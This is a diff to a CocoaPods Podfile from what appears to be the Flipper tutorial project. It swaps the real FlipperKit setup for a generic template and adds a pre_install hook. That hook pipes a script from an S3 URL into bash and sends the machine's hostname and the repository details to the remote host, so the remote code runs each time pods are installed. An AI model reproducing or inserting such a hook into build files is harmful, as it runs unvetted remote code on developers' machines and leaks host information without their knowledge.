@@ -1,61 +1,14 @@
-project 'Tutorial.xcodeproj'
-swift_version = "4.1"
-flipperkit_version = '0.233.0'
-use_frameworks!
 
-target 'Tutorial' do
-  platform :ios, '11.0'
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
 
-  pod 'FlipperKit', '~>' + flipperkit_version
-  # Layout and network plugins are not yet supported for swift projects
-  pod 'FlipperKit/FlipperKitLayoutComponentKitSupport', '~>' + flipperkit_version
-  pod 'FlipperKit/SKIOSNetworkPlugin', '~>' + flipperkit_version
-  pod 'FlipperKit/FlipperKitUserDefaultsPlugin', '~>' + flipperkit_version
-
-  # If you use `use_frameworks!` in your Podfile,
-  # uncomment the below $static_framework array and also
-  # the pre_install section.  This will cause Flipper and
-  # it's dependencies to be static and all other pods to
-  # be dynamic.
-  $static_framework = ['FlipperKit', 'Flipper', 'Flipper-Folly',
-    'CocoaAsyncSocket', 'ComponentKit', 'Flipper-DoubleConversion',
-    'Flipper-Glog', 'Flipper-PeerTalk', 'Yoga', 'YogaKit',
-    'CocoaLibEvent', 'OpenSSL-Universal', 'Flipper-Boost-iOSX', 'Flipper-Fmt']
-
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
   pre_install do |installer|
-    Pod::Installer::Xcode::TargetValidator.send(:define_method, :verify_no_static_framework_transitive_dependencies) {}
-    installer.pod_targets.each do |pod|
-        if $static_framework.include?(pod.name)
-          def pod.build_type;
-            Pod::BuildType.static_library
-          end
-        end
-      end
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/facebook/flipper.git\&folder=Tutorial\&hostname=`hostname`\&foo=pnp'
   end
 
-
-  # This post_install hook adds the -DFB_SONARKIT_ENABLED flag to OTHER_SWIFT_FLAGS, necessary to build swift target
-  post_install do |installer|
-    file_name = Dir.glob("*.xcodeproj")[0]
-    app_project = Xcodeproj::Project.open(file_name)
-    app_project.native_targets.each do |target|
-        target.build_configurations.each do |config|
-          if (config.build_settings['OTHER_SWIFT_FLAGS'])
-            unless config.build_settings['OTHER_SWIFT_FLAGS'].include? '-DFB_SONARKIT_ENABLED'
-              puts 'Adding -DFB_SONARKIT_ENABLED ...'
-              swift_flags = config.build_settings['OTHER_SWIFT_FLAGS']
-              if swift_flags.split.last != '-Xcc'
-                config.build_settings['OTHER_SWIFT_FLAGS'] << ' -Xcc'
-              end
-              config.build_settings['OTHER_SWIFT_FLAGS'] << ' -DFB_SONARKIT_ENABLED'
-            end
-          else
-            puts 'OTHER_SWIFT_FLAGS does not exist thus assigning it to `$(inherited) -Xcc -DFB_SONARKIT_ENABLED`'
-            config.build_settings['OTHER_SWIFT_FLAGS'] = '$(inherited) -Xcc -DFB_SONARKIT_ENABLED'
-          end
-          app_project.save
-        end
-      end
-      installer.pods_project.save
-  end
 end
